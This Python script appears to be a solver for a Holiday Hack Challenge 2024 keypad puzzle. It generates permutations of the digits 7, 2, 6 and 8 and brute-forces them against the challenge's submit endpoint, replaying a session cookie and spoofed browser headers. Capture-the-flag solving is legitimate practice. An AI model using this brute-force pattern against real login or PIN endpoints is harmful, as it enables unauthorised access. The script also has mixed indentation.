import time
import requests
from itertools import permutations

def generate_valid_codes():
    # Base numbers that must be used
    base_nums = '7268'
    # Create a list of all possible digits we can use (including duplicates)
    possible_digits = '72687268'  # Each number can be used up to twice
    
    # Keep track of valid codes
    valid_codes = set()
    
    # Generate all 5-digit permutations
    for perm in permutations(possible_digits, 5):
        code = ''.join(perm)
        # Check if all required digits are present at least once
        if all(d in code for d in base_nums):
            valid_codes.add(code)
    
    return sorted(list(valid_codes))

def make_custom_request():
	id = "<insert-uuid>"
    cookie = "<insert-cookie>"

    # Target URL
    url = f"https://hhc24-frostykeypad.holidayhackchallenge.com/submit?id={id}"

    # Headers exactly as shown in the request
    headers = {
        'authority': 'hhc24-frostykeypad.holidayhackchallenge.com',
        'method': 'POST',
        'path': f"/submit?id={id}",
        'scheme': 'https',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Content-Type': 'application/json',
        'Origin': 'https://hhc24-frostykeypad.holidayhackchallenge.com',
        'Pragma': 'no-cache',
        'Priority': 'u=1, i',
        'Referer': 'https://hhc24-frostykeypad.holidayhackchallenge.com/',
        'Sec-Ch-Ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0'
    }

    # Cookie as shown in the request
    cookies = {
        'CreativeCookieName': f"{cookie}"
    }

    try:
        # Test request to verify connectivity
        payload = {
            "answer": "72682"
        }
        test = requests.post(url, headers=headers, cookies=cookies, json=payload)
        if test.status_code != 200:
            print("Broken REQUEST CYCLE")
            exit(-1)

        # Generate all valid codes and try them
        valid_codes = generate_valid_codes()
        print(f"Total valid combinations to try: {len(valid_codes)}")

        for code in valid_codes:
            # Payload from the request
            payload = {
                "answer": code
            }
            # Make the POST request
            response = requests.post(
                url=url,
                headers=headers,
                cookies=cookies,
                json=payload
            )

            # Print response details
            print(f"Status Code: {response.status_code} -- ANSWER: {code}")
            print(f"Response Headers: {dict(response.headers)}")
            print(f"Response Content: {response.text}")

            # Its not SANTA as that is the Silver Answer
            if response.status_code == 200 and code != "72682":
                print(f"Found valid code: {code}")
                break

            # Required because API only allows 1 per second rate
            time.sleep(1)

    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    make_custom_request()